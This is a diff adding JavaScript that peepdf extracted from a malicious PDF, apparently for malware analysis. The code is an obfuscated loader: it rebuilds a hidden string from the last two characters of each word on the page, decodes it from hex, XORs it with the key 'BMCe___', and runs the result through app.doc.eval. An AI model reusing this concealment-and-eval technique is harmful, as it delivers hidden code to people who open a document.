@@ -1,0 +1,36 @@
+// peepdf comment: Javascript code located in object 11 (version 0)
+
+function iQA3_q(Ga5iUW) {
+    var mfKqOf = '';
+    for (p_r24F_F = 0; p_r24F_F < Ga5iUW.length; p_r24F_F += 2) {
+        mfKqOf += String.fromCharCode(parseInt('' + Ga5iUW.charAt(p_r24F_F) + Ga5iUW.charAt(p_r24F_F + 1), 16).toString(10));
+    }
+    return mfKqOf;
+}
+function oqunRlh(Ga5iUW, U_bHD_Q) {
+    var mfKqOf = '';
+    var YsL4____ = 0;
+    for (p_r24F_F = 0; p_r24F_F < Ga5iUW.length; p_r24F_F++) {
+        mfKqOf += String.fromCharCode(Ga5iUW.charCodeAt(p_r24F_F) ^ U_bHD_Q.charCodeAt(YsL4____++));
+        if (YsL4____ >= U_bHD_Q.length) {
+            YsL4____ = 0;
+        }
+    }
+    return mfKqOf;
+}
+
+// peepdf comment: Javascript code located in object 13 (version 0)
+
+ var o = '';
+
+ var numWords = this.getPageNumWords(this.pageNum);
+
+ for (var i = 0; i < numWords; i++) {
+     word = this.getPageNthWord(0, i);
+     o += word.substr(word.length - 2, 2);
+ }
+
+// peepdf comment: Javascript code located in object 15 (version 0)
+
+app.doc.eval(oqunRlh(iQA3_q(o), 'BMCe___'));
+
